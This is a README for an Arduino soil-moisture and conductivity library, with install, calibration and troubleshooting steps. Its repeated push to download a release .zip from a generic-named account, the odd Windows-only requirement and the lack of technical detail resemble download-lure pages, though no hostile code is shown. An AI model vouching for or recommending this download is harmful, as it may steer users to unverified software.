# 💧 PulseWetProbe-Arduino - Precise Soil Moisture Monitoring Made Simple

[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases)

PulseWetProbe-Arduino provides a reliable way to monitor soil moisture and conductivity. It works with hardware probes to measure water content in soil. This library helps you gather data for gardening, agriculture, or industrial projects. It handles signal processing to give you clean, usable numbers.

## 📋 What This Tool Does

This library manages the sensing process for your hardware. It handles the electrical pulses required to measure soil wetness without damaging the probes through corrosion. It includes features to filter out noise, calibrate your specific sensors, and track trends over time. You gain access to data in common formats for use in your records.

Key capabilities include:
- Accurate moisture sensing across different soil types.
- Conductivity tracking to detect changes in nutrient levels.
- Pre-built calibration routines to ensure data quality.
- Digital signal filtering to remove erratic readings.
- Diagnostic logs to check if sensors work.
- Data export in CSV or JSON formats.

## 💻 System Requirements

To use this software, you need a Windows computer and the Arduino environment.
- Operating System: Windows 10 or Windows 11.
- Software: Arduino IDE version 2.0 or newer.
- Hardware: A computer with an available USB port.
- Connection: A standard USB cable to link your computer to the microcontroller.

## 📥 Get the Software

Visit the following page to download the latest library files for your system:

[https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases](https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases)

Follow these steps to prepare your computer:

1. Open the link provided above in your web browser.
2. Locate the section labeled Assets.
3. Click the link that ends in .zip to save the package to your computer.
4. Keep the file in your Downloads folder for easy access.

## ⚙️ Installation Process

Installing this library requires the Arduino IDE. Follow these steps to finish the setup:

1. Launch the Arduino IDE on your Windows computer.
2. Navigate to the top menu bar.
3. Select Sketch.
4. Click on Include Library.
5. Choose Add .ZIP Library from the list.
6. Find the file you downloaded in your Downloads folder.
7. Select the file and click Open.

The Arduino IDE will extract the files and add them to your system. A notification will appear at the bottom of the window confirming that the library is ready.

## 🧪 Connecting Your Hardware

Before you run the code, connect your sensing hardware.

1. Plug your microcontroller into your computer using the USB cable.
2. Check that the port is active by looking at the Tools menu in the Arduino IDE.
3. Select Port from the menu and ensure your device appears in the list.

If the port does not appear, check your cable connection or try a different USB port on your machine.

## 🚀 Running Your First Test

You can test the connection by using the provided example sketches. This confirms that the library handles your hardware as expected.

1. In the Arduino IDE, go to File.
2. Look for Examples.
3. Scroll through the list to find PulseWetProbe-Arduino.
4. Select the basic test sketch from the menu.
5. Click the Upload button, which is the right-pointing arrow icon in the top left corner.
6. The IDE will compile the code and send it to your device.

Once the upload finishes, open the Serial Monitor. This tool is in the top right corner of the IDE. Set the baud rate to 9600. You will see measurements appear on your screen as the probe sends data.

## 🛠 Calibration Tips

Every soil composition is different. Calibration ensures that your readings mirror the reality of your soil. 

1. Place your sensor probe in a completely dry sample of your soil.
2. Note the numerical value in the Serial Monitor.
3. Saturate the same soil sample with water until it remains wet.
4. Note the new numerical value in the Serial Monitor.
5. Update your calibration constants in the sketch using these two numbers.

This process links the raw electrical values to a percentage of moisture, making your data meaningful.

## 📈 Understanding the Data

The library outputs data in two ways. You can choose CSV format for spreadsheets or JSON format for logs.

- CSV: This format provides a comma-separated list of values. It is ideal for importing into Excel or Google Sheets for graphing.
- JSON: This format uses labels for each piece of data. It is ideal if you plan to send the information to a web server or a database.

If you encounter empty values during a session, ensure your probe cables are secure. Loose connections cause the library to report errors in the diagnostic section.

## 🏗 Maintenance Guidelines

Keep your probes clean. Minerals in water and soil build up on metal surfaces over time. This layer affects conductivity readings. Use a soft cloth to wipe the probe if you suspect a build-up. Do not use abrasive materials that might scratch the metal.

If you change the length of the wire between the probe and the board, you may need to re-calibrate. Longer wires introduce resistance that changes the raw readings.

## ❓ Troubleshooting

If you fail to get readings, check these common items:

- Check the power connection to your sensor.
- Ensure the library is installed properly through the Sketch menu.
- Verify that your board is selected correctly in the Tools menu.
- Check that the Serial Monitor uses the same speed setting defined in your sketch.

Detailed diagnostics are part of the library. If you need deeper insight into the sensor health, call the diagnostic function within your code to see if the internal circuit reports any warning flags.